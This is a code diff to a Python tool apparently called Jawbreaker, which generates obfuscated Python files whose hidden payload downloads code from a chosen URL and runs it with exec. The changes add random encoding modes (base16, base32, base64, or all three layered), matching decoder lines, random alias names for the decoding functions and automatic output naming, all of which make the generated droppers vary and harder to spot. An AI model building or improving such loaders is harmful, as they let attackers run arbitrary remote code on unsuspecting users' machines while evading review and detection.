@@ -26,6 +26,8 @@ def clear():
 clear()
 
 
+strings = "abcdefghijklmnopqrstuvwxyz0123456789"
+
 
 if name == 'nt':
     system("title Jawbreaker")
@@ -96,9 +98,14 @@ if not isfile(file):
     exit()
 
 output = input(Col.gray+"Enter name of output file > "+Col.white)
-if not output and not isfile("new.py"):
-    output = "new.py"
-
+if not output:
+    if not isfile("new.py"):
+        output = "new.py"
+    else:
+        while True:
+            output = "new" + str(randint(10, 100)) + ".py"
+            if not isfile(output):
+                break
 
 
 
@@ -116,19 +123,18 @@ def nfile(file:object, only:bool=False) -> tuple:
     for name in temp_names:
         random_name = random()
         if name == "exec":
-            exc = random_name = "sha256"
+            exc = random_name
         elif name == "b16decode":
-            b16 = random_name = "hash"
-            file.write(f"from base64 import b16decode as {random_name};")
             b16 = random_name
+            file.write(f"from base64 import b16decode as {b16};")
             continue
         elif name == "b32decode":
-            b32 = random_name = "b16"
-            file.write(f"from base64 import b32decode as {random_name};")
+            b32 = random_name
+            file.write(f'from base64 import b32decode as {b32};')
             continue
         elif name == "b64decode":
-            b64 = random_name = "xor"
-            file.write(f"from base64 import b64decode as {random_name};")
+            b64 = random_name
+            file.write(f'from base64 import b64decode as {b64};')
             continue
         elif name in ignore:
             continue
@@ -142,6 +148,13 @@ def random(l:int=2) -> str:
             defined.append(rdm)
             return rdm
     
+def gmode():
+    modes = {"1": "all",
+            "2": "b16",
+            "3": "b32",
+            "4": "b64"}
+    return randint(1, 4)
+
 
 def build():
 
@@ -179,8 +192,23 @@ def build():
     file_1.write(f"{chars_list}=[];")
     content = f"""{exc}({urlp}({req}("{url}")).read())"""
 
+
+    print("Generating random mode...")
+
+    mode = gmode()
+
+    print("Random mode: " + str(mode))
+
     Col.printf("Encoding content...")
-    content = b16encode(b32encode(b64encode(content.encode(encoding)))).decode(encoding)
+
+    if mode == 1:
+        content = b16encode(b32encode(b64encode(content.encode(encoding)))).decode(encoding)
+    elif mode == 2:
+        content = b16encode(content.encode(encoding)).decode(encoding)
+    elif mode == 3:
+        content = b32encode(content.encode(encoding)).decode(encoding)
+    elif mode == 4:
+        content = b64encode(content.encode(encoding)).decode(encoding)
 
     random_chars_list = []
 
@@ -202,7 +230,17 @@ def build():
     file_1.write(f"{content_name} = ''.join({chars_list});")
 
     Col.printf("Building desobfuscator...")
-    file_1.write(f"{exc}({b64}({b32}({b16}({content_name}))));")
+
+    if mode == 1:
+        dcontent = f"{exc}({b64}({b32}({b16}({content_name}))));"
+    elif mode == 2:
+        dcontent = f"{exc}({b16}({content_name}));"
+    elif mode == 3:
+        dcontent = f"{exc}({b32}({content_name}));"
+    elif mode == 4:
+        dcontent = f"{exc}({b64}({content_name}));"
+
+    file_1.write(dcontent)
 
 
 
